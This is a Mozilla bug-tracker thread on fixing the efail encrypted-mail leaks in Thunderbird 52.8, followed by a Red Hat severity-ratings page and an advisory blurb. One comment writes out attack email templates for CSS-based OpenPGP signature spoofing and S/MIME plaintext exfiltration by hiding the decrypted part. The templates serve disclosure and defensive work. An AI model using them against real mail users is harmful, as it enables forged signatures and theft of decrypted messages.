I'm not sure what you're referring to. Prior to 52, composition was doing window->GetDocShell()->SetAppType(nsIDocShell::APP\_TYPE\_EDITOR); This was a major problem that I fixed in [bug 1151366](/show_bug.cgi?id=1151366 "RESOLVED FIXED - File disclosure via covertly imposed attachments in HTML emails").

Well, the charset= part wasn't a no-op, was it? Ben? I'd prefer to leave it in for now.

Huh? If it said Context-Type instead of Content-Type it will have been completely ignored.

No, you had:
<meta http-equiv="Context-Type" content="text/html; charset=..."
So perhaps the first part was ignored, not the second. Anyway, I'm leaving it in for now, please file a follow-up. We're running out of time with nit discussions.

The charset= is inside the content quote, so it would not make any difference. There's no second part. But sure, do a followup.

I came to adjust the test to Content-Type and noticed the following:
Some part of the system still inserts content-type, so in order to get the test to pass, I need to:
replace(/[\n]\*<meta http-equiv="Content-Type" content="text\/html; .\*">[\n]\*/ig, "")
Note the /ig, so ignoring case. Maybe that comes from here:
<https://searchfox.org/mozilla-central/rev/8affe6e83188787eb61fe0528eeb6eef6081ba06/dom/base/nsXHTMLContentSerializer.cpp#378>
However, after taking that first hurdle, the program crashes when running test\_mime\_emitter.js:
nss3.dll!PR\_Assert(const char \* s, const char \* file, int ln) Line 553 C
xul.dll!MimeInlineText\_parse\_end(MimeObject \* obj, bool abort\_p) Line 249 C++

test\_mime\_attachments\_size.js equally crashes.
So maybe the obvious change of moving the eol() calls around wasn't so obvious.
Ben, if you want to debug it:
mach xpcshell-test --interactive ...
then you can attach the debugger before running the test.

Looking at the CSS for moz-text-html I didn't find any. So perhaps we return to the previous version of the patch that didn't cause crashes and fix the <div> issue in [bug 1462895](/show_bug.cgi?id=1462895 "RESOLVED FIXED - In \"original HTML\" and \"simple HTML\" view the body of the message is placed outside <div class=moz-text-html>") later for both sanitised and parsed/standard HTML?

That said, the DOM for sanitised HTML being wrong points to some internal problem, so moving this problem onto the main code path for all HTML without understanding it appears a little risky, especially in a dot release 52.8.1.

Well, I tried the sanitised HTML view which uses similar code and removed writing of the meta tag. I tried in UTF-8 and windows-1252 and the display was still OK. I don't now how Gecko managed that.
The code also generates:
<div class="moz-text-html" lang="x-western"></div> or
<div class="moz-text-html" lang="x-unicode"></div>
which is completely wrong since the lang attribute should have a language tag, like "en-US" or "de-AT" or so. So this area also needs a clean-up sadly.

> It's not fixing for composition because the decrypted content is still there in the reply, even now when the parts are parsed separately.
Hey Magnus, ah, yes, but that's a completely separate issue, and different fix.
The user can still detect it with the scrollbar etc.
This would be fixed by solution 3 in [comment 57](/show_bug.cgi?id=1419417#c57 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"). That's another bug.
> The DOM created still has the body outside the <div>
I've looked at the raw libmime output and the Dev Tools, and the <div> is around the HTML email. I'll attach a screenshot.
I've used a real HTML mail as test. Pay attention when using the attack emails here for testing, because they have empty HTML documents, so they can be easily confusing when used for verification.
Also, make sure that you have Original HTML on, not Sanitized HTML. I've been tripped by that once during my dev, too.

Yes, given that the main concrete effect of the <div> is the missing margin of the separator, I think that's tolerable. We can still fix it in a later 52.9.0 or 60 release, if need be.
I'm for shipping the fix as I had it last Wednesday, that worked and fixed the security bug.

Please be careful. If you look at Firefox Preferences Font dialog, you see that it mixes languagues with "Unicode". If you look in browser/components/preferences/fonts.xul, it actually uses "x-unicode" for what's now called "Other languages" in the UI, and "x-western" also exists and is called "Latin" in the Firefox Font UI. So that code is actually perfectly correct for Gecko. And that's the point here, to pick the right font family for display. So, please don't be presumptuous in judging and esp. modifying that code. Like a grandfather, libmime is old code, and it's not perfect, but it does work. Be careful before dismissing it, you might really break stuff.

Sorry Ben, you're confused here. I'm quite aware of encodings and writing systems and how Gecko tries to derive one from the other. Further reading in [bug 1228193 comment #10](/show_bug.cgi?id=1228193#c10 "NEW - UX problem selecting font for UTF-8 encoded plain text mail (see comment #8)").
Unicode (UTF-8) and Western (windows-1252) in the |View > Text Encoding| menu are encodings. "x-unicode" (Other Languages) and "x-western" (Latin) are writing systems. Language is something different, but language maps to writing system.
<https://dxr.mozilla.org/mozilla-central/source/intl/locale/langGroups.properties>
Stuffing a writing system into the lang attribute seems 100% wrong, but let's discuss this in [bug 1463133](/show_bug.cgi?id=1463133 "RESOLVED FIXED - Investigate whether writing a meta tag in mimethsa.cpp is needed and whether writing lang=x-unicode in mimethtm.cpp makes any sense").

Ben, with the latest patch, viewing HTML messages just crashes, also seen in the test crashes.
The message from [attachment 8979247](/attachment.cgi?id=8979247 "multi-html.eml") [[details]](/attachment.cgi?id=8979247&action=edit "multi-html.eml") only shows horizontal lines. So sorry, your patch doesn't work at all.

Ben, viewing this message crashes. Please try a few "normal" HTML messages. This one is multi-part related. It crashes in original HTML and sanitised. I have the C++ patch here and the one from [bug 1462895](/show_bug.cgi?id=1462895 "RESOLVED FIXED - In \"original HTML\" and \"simple HTML\" view the body of the message is placed outside <div class=moz-text-html>") applied.
As mentioned, the Xpcshell tests also crash. Frankly, I'm tired, I've tried stuff all day. libmime isn't as brilliant as you said, you poke it, and it breaks :-(

I'm done here. I've been working on this since almost a week, more than full time, and most of that on the review and building various branches. I'm seriously neglecting my job.
> Ben, with the latest patch, viewing HTML messages just crashes, also seen in the test crashes.
Like I said, trunk without any changes crashes for me on startup, so I can't do anything for trunk.
52.8.1 is what we need to get out right now. The 52 patch works for me for TB 52. Including the test message you attached, and all messages from my inbox that I tried, and the attack emails. 52 hasn't ever crashed for me. Did you test on 52? Does it work?
But if this v5.1 patch really doesn't work, then we can land v4. It misses the margin for the separator, but that's not that serious. We can fix it later properly. We need to get the security fix out.
Jörg or Magnus, it's up to you now. We can land either v5.1 or v4.

A few comments:
Part one is v4 with my clean-up:
I opted for "content-type" because other parts of the system use that string in lower case. That makes the test easier. Also, that will most likely be removed in [bug 1463133](/show_bug.cgi?id=1463133 "RESOLVED FIXED - Investigate whether writing a meta tag in mimethsa.cpp is needed and whether writing lang=x-unicode in mimethtm.cpp makes any sense"). It also matches mimethsa.cpp.
I'm not comfortable uplifting this, since the DOM created by the patch isn't right, see [bug 1462895](/show_bug.cgi?id=1462895 "RESOLVED FIXED - In \"original HTML\" and \"simple HTML\" view the body of the message is placed outside <div class=moz-text-html>"), so the body comes after the <div> tag. We should address this in [bug 1462895](/show_bug.cgi?id=1462895 "RESOLVED FIXED - In \"original HTML\" and \"simple HTML\" view the body of the message is placed outside <div class=moz-text-html>") for "original" and "simple" HTML now.

My whole goal here was to fix TB 52.
But that's now in the hands of drivers.

Per Mozilla security bug policy, we unhide security bugs where the details are public anyway. I am going to unhide this bug in 3 days. Because the bug and exploit is very public, literally front page news, and the paper with the bug and attack details has been released about a week ago, and people are very interested in the status.

I'll get it uplifted. I think it's quite risky since we're drastically change the HTML processing. So we might trigger all sorts of bugs/crashes in Gecko's parser or serialiser.

I found some time to re-test TB nightly (2018-05-22) and Enigmail version 2.0.5 (20180521-1522).
As far as I can tell, the related preconnect remote content bypass is fixed ([bug 1408867](/show_bug.cgi?id=1408867 "RESOLVED FIXED - Privacy Issue: preconnect bypasses remote content block")). As well is leaking the plaintext by tricking the user into submitting the it via HTML forms ([Bug 1450345](/show_bug.cgi?id=1450345 "RESOLVED FIXED - prevent form submission for <button> too"), [Bug 1462910](/show_bug.cgi?id=1462910 "RESOLVED FIXED - Efail: Using form to exfiltrate encrypted mail part by pressing enter in form field")) or remote images ([bug 1457721](/show_bug.cgi?id=1457721 "RESOLVED FIXED - fix efail PoC 3: Leaking plaintext through src attribute")).
Please note that there may still be bypasses -- in the long term I'd agree with what Ben said ([comment 57](/show_bug.cgi?id=1419417#c57 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails")).
What still works imho is variants of OpenPGP signature spoofing and S/MIME reply-or-forward exfiltration:
\* OpenPGP: signature spoofing based on hiding the real signed text with CSS
---------------------------------------------------
Content-Type: text/html
This is arbitrary text inserted by the attacker...
The mail says `good signature' by the entity below
<div style="color: red;">
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
THIS PART IS SIGNED BUT CAN BE HIDDEN WITH CSS
-----BEGIN PGP SIGNATURE-----
...
-----END PGP SIGNATURE-----
```
---------------------------------------------------
\* S/MIME: decrypted MIME parts can be completely hidden with CSS; if user replies/forwards in HTML format the (non-visible) plaintext is leaked, otherwise (in text-only reply mode) the victim could be fooled by inserting newlines
---------------------------------------------------
Content-Type: multipart/mixed; boundary="BOUNDARY"
--BOUNDARY
Content-Type: text/html
Reply please to this email
<div style="color: red;">
--BOUNDARY
Content-Type: application/pkcs7-mime; name="smime.p7m"; smime-type=enveloped-data
Content-Transfer-Encoding: base64
...
--BOUNDARY--
---------------------------------------------------
Also I still don't feel comfortable with mailto:?html-body=whatever
Do we actually need this? It allows a website to put untrusted input into composer. This enables an attacker to escalate into HTML context (even if HTML-composing has been disabled by the user); furthermore stuff like <video poster="..."> is loaded automatically here (no user interaction required). If there is no valid requirement for ?html-body it should be removed from TB, imho. (I'm unable to exploit it straight-forward but I have a really bad feeling about this feature).Status: RESOLVED → REOPENEDFlags: needinfo?(jens.a.mueller)Resolution: FIXED → ---

That attacks the composer and is an issue separate from the one that was fixed here.
I actually have a solution for that, and a fix. It's the "Sanitize HTML quotes" patch here. It's already described and covered in [comment 57](/show_bug.cgi?id=1419417#c57 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails") point 2.
For the sake of not prolonging this bug which already has over 200 comments, I would suggest to tackle that separate issue in another bug.

Some comments based on viewing code in the commits linked to from [comment 205](/show_bug.cgi?id=1419417#c205 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"):
\* Assembling the whole document that's displayed by concatenating strings seems more error prone and less efficient than parsing each MIME part into a document fragment (nsIParserUtils::parseFragment()) using <body> as the context node, sanitizing to remove forms, etc., and then appending the resulting fragments into a skeleton document wrapped in the kind of fieldsets (created using the DOM APIs) that are currently produced by injecting source text.
\* While it's unlikely in practice for encrypted parts to contain form controls with a form attribute whole value the attacker could guess, it's worthwhile to be aware of <https://html.spec.whatwg.org/#attr-fae-form> . Since it's implausible enough for form submissions to be a legitimate use case in the context of emails that contain encrypted parts, I recommend erring on the side of sanitizing more (setting SanitizerDropForms, etc.) in all MIME parts when there is at least one encrypted MIME part. It's not like you need to show a browser-like newsletter rendering experience for encrypted emails.
\* In addition to sanitizing form and form control elements, it would probably be a good idea to block form submissions in the message viewer and message editor docshells.

... and more importantly [bug 1464056](/show_bug.cgi?id=1464056 "RESOLVED FIXED - [efail] S/MIME plaintext can be leaked through HTML reply/forward"), right? Suppressing <plaintext> is one thing, but preventing subordinate parts being decrypted is an approach that will also stop attacks where the decrypted part is hidden by CSS.

Ben, sadly your changes here exposed ancient old bugs to the regular HTML forward:
[Bug 313401](/show_bug.cgi?id=313401 "RESOLVED DUPLICATE - forwarding multipart/related message inline does not include body, if <html> tag has attribute and View/Message Body As/Simple HTML is used") and [bug 394322](/show_bug.cgi?id=394322 "RESOLVED FIXED - forward inline from Simple HTML view creates blank email if html tag has attribution (typically originating from MS software)"). We got there via [bug 1470210](/show_bug.cgi?id=1470210 "RESOLVED DUPLICATE - Forward Inline fails to include original HTML message text when inline image is present").
So this is certainly NOT ready for prime time use since it destroys inline forwarding of messages received from users using MS software.

MailNews Core :: MIME
Problems with parsing the MIME structure and displaying messages. When this problem happens, it's often useful to attach a copy of the mail message generating the problem. If you have Communicator 4.x, you can select the message and save it as an .eml file (just save with the .eml extension). A few examples: 1. The contents of a message do not display properly. Certain items do not show up.

MDN says firefox doesn't support <plaintext> - <https://developer.mozilla.org/en-US/docs/Web/HTML/Element/plaintext>
... but it seems it does.
It's not treated as <pre>, but really treated as <plaintext>, which has no closing tag(!!). This makes for some pretty interesting and unexpected dom trees in cases when you hope the parser would make sense of the garbage you throw at it. Like [bug 1464056 comment 18](/show_bug.cgi?id=1464056#c18 "RESOLVED FIXED - [efail] S/MIME plaintext can be leaked through HTML reply/forward") - where for some cases Thunderbird is pulling two doms together and displaying them in one.
I'd suggest actually removing support for <plaintext> since at least according to mdn no browser supports it.

OK, change the tag to <pre> or remove it and everything that follows? It's easily doable like MimeInlineTextHTML\_insert\_lang\_div() introduced in [bug 1462895](/show_bug.cgi?id=1462895 "RESOLVED FIXED - In \"original HTML\" and \"simple HTML\" view the body of the message is placed outside <div class=moz-text-html>").

Wow, I got it all wrong. This is a Code::DOM bug. In any case, with the MIME tweak suggested here, we're cooking with gas ;-)
We can other move this to a new bug, or move this bug here to Mailnews and file another Core::DOM bug.

It should just ignore the element, so replace it with nothing. Also need to account for attributes. But let's to it in another bug.
But I'd like to hear from DOM folks about removing the support from DOM. If this something they agree to we can just take that patch for our branch too, at least 60.

Magnus, you misspelled the closing tag, but even with </plaintext> that closing tag would be ignored.

MDN's compat table there is just wrong. <plaintext> is supported by Firefox, Chrome, Safari, and Edge, as you could tell if you had just tested it instead of asking me to test it... And there are sites that use it to ensure that nothing after that is parsed as markup, so removing it would likely introduce XSS bugs in sites. See also <https://html.spec.whatwg.org/multipage/parsing.html#plaintext-state> and the 'A start tag whose tag name is "plaintext"' bit in <https://html.spec.whatwg.org/multipage/parsing.html#parsing-main-inbody>
I filed <https://github.com/mdn/browser-compat-data/issues/2168> to get the compat table fixed to reflect reality.Status: NEW → RESOLVEDClosed: 7 years agoFlags: needinfo?(bzbarsky)Resolution: --- → INVALID

That can be done in a loop.

You mean: detect <plaintext attr=xxx>?

I recycled this one, so we have the "DOM answer" included.

I think we shouldn't bother with the closing tag, since that do not exit. Which is the whole reason we do this replace.

Why xx-? Can we make it x-plaintext, like x-western or x-unicode?

Well, if you look at the selialised HTML returned from Gecko, it \*dose\* have the closing tag. So for symmetry we should replace it as well.

for forward it's not quite clear it would always have a <body>. Seems it does have one now, but if there's no reason to check for it I'd remove that part so it doesn't break in the future.

I guess the check was copied from MimeInlineTextHTML\_insert\_lang\_div() where we need and have a body to insert our "language div".
In this case here, I can drop the body check.

1. There should be no need to do this in the HTMLSanitizer class, because if the sanitizer works correctly, it should already strip such funny tags, given that it works based on a whitelist. If <plaintext> passes the sanitizer, there's something badly wrong with the sanitizer. Could you please verify that <plaintext> is stripped even without the patch?
2. I don't like all this string messing. Please make sure you're not introducing buffer overflows :). The ignoreCase oversight is a good example of what can go wrong when you do search&replace on existing HTML documents for security. It doesn't work well. Inserting a <div> or other HTML tag is something else, you don't run into the same problems.
3. For the HTMLParsed class, we have a full DOM tree, so it could be removed this way.
4. Personally, I would rather strip the <plaintext> tag altogether than insert the "x-".
5. Also, like Magnus said, replacing </plaintext is unnecessary and is extra code.
> index += 12;
6. NIT: I'd use simply index++. Safer in case we to replace it with "" later.

Yes, already working without the patch. I can remove the call.

There was no oversight. The previous code worked since anything returned from Gecko has lowercase tags. I just added the ignoreCase wholesale just in case that ever changes.

So you suggest to implement this twice??

Well, as I said, it comes out of the parser, so we might as well replace it for symmetry.

No, I was suggesting to use DOM manipulation instead of string manipulation.

Yes, but in compose you don't have a DOM. Besides, I fail to see that traversing the DOM recursively looking for <plaintext> and then moving its children to a different parent would be any faster than a string search and inserting of two characters.

# Severity ratings

## Understanding Red Hat security ratings

Red Hat Product Security rates the severity of security issues found
in Red Hat products using a four-point scale (Low, Moderate,
Important, and Critical), as well as including a separate Common
Vulnerability Scoring System (CVSS) base score. These scoring systems
provide a prioritized risk assessment to help you understand and
schedule upgrades to your systems, enabling informed decisions on the
risk each issue places on your unique environment.

The four-point scale tells you how serious Red Hat considers an issue
to be, helping you judge the severity and determine the most important
updates. The scale takes into account the potential risk based on a technical analysis of the exact flaw and its type. The risk level of a flaw does not change if an exploit or worm is later released for a flaw, or if one is available before the release of a fix. A flaw will only be re-evaluated if new technical details emerge.

The following table provides severity ratings for Red Hat products and systems. For flaws specific to AI models, see [Red Hat security ratings for AI models](https://access.redhat.com/security/ai).

| **Severity ratings** | **Security flaw description** |
| --- | --- |
| **Critical impact** | This rating is given to flaws that could be easily exploited by a remote unauthenticated attacker and lead to system compromise (arbitrary code execution) without requiring user interaction, or easily cause system compromise via inference end points on AI systems. Flaws that require authentication, local or physical access to a system, or an unlikely configuration are not classified as Critical impact. These are the types of vulnerabilities that can be exploited by worms. |
| **Important impact** | This rating is given to flaws that can easily compromise the confidentiality, integrity or availability of resources. These are the types of vulnerabilities that allow local or authenticated users to gain additional privileges, allow unauthenticated remote users to view resources that should otherwise be protected by authentication or other controls, allow authenticated remote users to execute arbitrary code, allow remote users to cause a denial of service, or can cause system compromise via inference end points on AI systems. |
| **Moderate impact** | This rating is given to flaws that may be more difficult to exploit but could still lead to some compromise of the confidentiality, integrity or availability of resources under certain circumstances. It is also given to flaws that could be exploited to cause denial of service-like conditions on AI systems via an inference end point, or allow attackers to steal other users’ data from the AI system without authorization. These are the types of vulnerabilities that could have had a Critical or Important impact but are less easily exploited based on a technical evaluation of the flaw and/or affect unlikely configurations. || **Low impact** | This rating is given to all other issues that may have a security impact. These are the types of vulnerabilities that are believed to require unlikely circumstances to be able to be exploited, or where a successful exploit would give minimal consequences. This includes flaws that are present in a program’s source code but to which no current or theoretically possible, but unproven, exploitation vectors exist or were found during the technical analysis of the flaw. |

A Red Hat security advisory can contain fixes for more than one
vulnerability and for packages for more than one product (such as both
Red Hat Enterprise Linux 7 and 8). Each issue in an advisory has a
severity rating for each product. The overall severity of an advisory
is the highest severity out of all the individual issues, across all
the products the advisory targets. For simplicity, advisories only
show the overall severity. The advisories contain links to the
relevant entries in Red Hat's bug-tracking system, where you can
examine individual severity ratings and additional commentary, as well
as links to the relevant pages in Red Hat’s CVE database.

When a technology—enabled and most likely used by default—completely
blocks the exploitation of a particular vulnerability across all
architectures, we will adjust the severity level. When a technology
reduces the risk of a vulnerability, we may adjust the severity level
and give an explanation of the decision in the bug-tracking  and CVE
database entries.

## Common Vulnerability Scoring System (CVSS)

Common Vulnerability Scoring System (CVSS) base scores provide
additional guidance about a vulnerability, giving a detailed severity
rating by scoring the constant aspects of a vulnerability: Attack
Vector, Attack Complexity, User Interaction, Privileges Required,
Scope, Confidentiality, Integrity, and Availability.

CVSS version 2 base metrics are available for all vulnerabilities from
2009-2016, as well as selected earlier vulnerabilities. In 2016, Red
Hat adopted the CVSS v3 standard, and all vulnerabilities going
forward will use version 3.1 for scoring. These scores are found on
the
[CVE pages](https://access.redhat.com/security/security-updates/#/cve)
(linked from the References section of each Red Hat Security Advisory).

Red Hat does not solely use the CVSS rating to determine the priority
with which flaws are fixed, or to determine the severity rating of the
vulnerability. It is used as a guideline to identify and describe key
metrics of a flaw, however the priority for which flaws are fixed is
determined by the overall severity of the flaw using the
aforementioned four-point scale.  CVSS is meant to help customers
prioritize the order in which they remediate flaws.

### CVSS v3 Base Metrics

The CVSS v3 base metrics group covers the constant aspects of a
vulnerability:

* Attack Vector (AV) - Expresses the "remoteness" of the attack and
  how the vulnerability is exploited.
* Attack Complexity (AC) - Speaks to the difficulty of executing an
  attack and what factors are needed for it to be successful. (Along
  with User Interaction, Attack Complexity was formerly part of the
  Access Complexity metric.).
* User Interaction (UI) - Determines whether the attack requires an
  active human to participate or if the attack can be automated.
* Privileges Required (PR) - Documents the level of user
  authentication required for the attack to be successful. (This
  replaces the former Authentication metric.).
* Scope (S) - Determines whether an attacker can impact a component
  beyond its security scope/authority.
* Confidentiality (C) - Determines whether unauthorized parties can
  access data and to what extent.
* Integrity (I) - Measures the impact to the trustworthiness and
  veracity of data.
* Availability (A) - Refers to the impact to accessibility of data or
  services for authorized users.

A formula translates these measurements into a single, numerical base
score, ranging from 0.0 (no risk) to 10.0 (highest risk). Refer to
[Common Vulnerability Scoring System v3.1: User Guide](https://www.first.org/cvss/user-guide)
for detailed descriptions of the base metrics. It is important to note
that the CVSS base metrics were designed to be used with the other
CVSS metric groups, notably the Temporal and Environmental metrics, to
provide an accurate representation of risk in customer environments.
Alone, the Base metrics offer a shallow view of the vulnerability
itself without accounting for deployment or the environment.

### How Red Hat Uses CVSS v3 Base Metrics

We aim to comply with the CVSS v3 standard when assigning base scores,
and Red Hat uses base metrics that reflect how a vulnerability affects
our products specifically.  In addition, we do not use the Qualitative
Severity Rating Scale in the CVSS v3.1 User Guide to rate severity,
and our severity ratings are always based on the aforementioned
four-point scale.  In some circumstances, it may not be obvious why a
flaw received a particular score. The following are some common
vulnerability types with our interpretation and typical scoring:

#### Libraries

It is not always possible to know how third-party applications use
libraries, making it difficult to give accurate CVSS v3 base metrics
for flaws in system libraries. When rating these flaws, we take into
account the way the library is used by applications that we ship, and
also look at other popular software that may use the library in a way
that would cause an issue to be of higher severity, and adjust the
score appropriately.

#### Other Common Scores

Flaws where a local, unprivileged user can cause a kernel to crash
(denial of service) typically score 5.5 (for example,
[CVE-2019-9213](https://access.redhat.com/security/cve/CVE-2019-9213)).

Flaws that allow a local, unprivileged user to escalate their
privileges to root typically score 7.8 (for example,
[CVE-2019-18634](https://access.redhat.com/security/cve/CVE-2019-18634)).

Cross-site scripting flaws are generally scored as having Low impact
to Integrity and/or Confidentiality, with no impact to Availability,
in line with scoring from other vendors and NVD. A typical score for
these flaws is 6.1 (for example,
[CVE-2020-11023](https://access.redhat.com/security/cve/CVE-2020-11023)).

### Base Score Variations Across Products

It is common for a given CVE-named vulnerability to have several
different CVSS base metrics, depending on the product, version, and
architecture. Examples of this include:

* A vulnerability that only affected some architectures. For example,
  [CVE-2019-15031](https://access.redhat.com/security/cve/CVE-2019-15031)
  only affected PowerPC.
* A vulnerability that is mitigated by source code protection
  mechanisms on some platforms. For example,
  [CVE-2018-1125](https://access.redhat.com/security/cve/CVE-2018-1125)
  could have led to arbitrary code execution on Red Hat Enterprise
  Linux, but it is only a denial of service because it was compiled
  with FORTIFY protections.
* A vulnerability that affected more than one product.  For example,
  [CVE-2020-14060](https://access.redhat.com/security/cve/CVE-2020-14060)
  affected a component in both OpenShift and OpenStack.  The severity
  to OpenStack was lower (Low) as compared to OpenShift (Moderate)
  based on its usage; the overall vulnerability itself was rated
  Important.

If CVSS v3 base scores are significantly different across products, we
note that separately wherever possible. If we do not split the score,
we report the metric that gives the highest CVSS v3 base score (the
worst-case outcome).

### Differences Between NVD and Red Hat Scores

For open source software shipped by multiple vendors, the CVSS base
scores may vary for each vendor's version, depending on the version
they ship, how they ship it, the platform, and even how the software
is compiled. This makes scoring vulnerabilities difficult for
third-party vulnerability databases, such as NVD, who can give only a
single CVSS base score to each vulnerability, or when comparing to
other vendors who score based on the characteristics of use in their
own products. See the
[National Vulnerability Database](https://nvd.nist.gov/vuln-metrics/cvss)
for more information regarding NVD security ratings.

These differences can cause the scores to vary widely. Other reasons
may include how the source code was compiled with certain compiler
flags or hardening technologies that reduce or eliminate the security
severity of a flaw, or how the software is used within the product.
Software running standalone may suffer from a flaw, but its use within
a product may preclude the vulnerable code from ever being used in a
way that could be exploited.

For example, NVD may rate a flaw in a particular service as having
High Impact on the CVSS CIA Triad (Confidentiality, Integrity,
Availability) where the service in question is typically run as the
root user with full privileges on a system. However, in a Red Hat
product, the service may be specifically configured to run as a
dedicated non-privileged user running entirely in a SELinux sandbox,
greatly reducing the immediate impact from compromise, resulting in
Low impact.

For these reasons, we recommend that, whenever possible, you use a
CVSS base score provided by Red Hat in preference to a score from a
third party. Please
[let us know](https://access.redhat.com/site/security/team/contact/)
if you believe we have given an incorrect CVSS v3 base score for a
particular vulnerability. We are happy to discuss and update if
needed.

##### Description

Mozilla developers and community members Alex Gaynor, Christoph Diehl, Christian Holler, Jason Kratzer, David Major, Jon Coppeard, Nicolas B. Pierron, Jason Kratzer, Marcia Knous, and Ronald Crane reported memory safety bugs present in Firefox 60, Firefox ESR 60, Firefox ESR 52.8, and Thunderbird 52.8. Some of these bugs showed evidence of memory corruption and we presume that with enough effort that some of these could be exploited to run arbitrary code.
